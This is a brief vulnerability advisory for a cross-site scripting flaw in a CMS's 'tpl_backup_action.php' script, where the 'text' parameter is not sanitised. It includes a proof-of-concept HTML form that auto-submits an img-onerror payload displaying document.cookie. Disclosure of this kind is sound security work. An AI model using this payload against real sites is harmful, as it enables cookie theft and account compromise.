Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "tpl_backup_action.php" script to properly sanitize user-supplied input in "text" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/cms/edit/tpl_backup_action.php" method="post" name="main" >
	<input type="hidden" name="action" value="message" />
	<input type="hidden" name="text" value='help text<img src=x onerror=alert(document.cookie)>' />
</form>
<script>
document.main.submit();
</script>
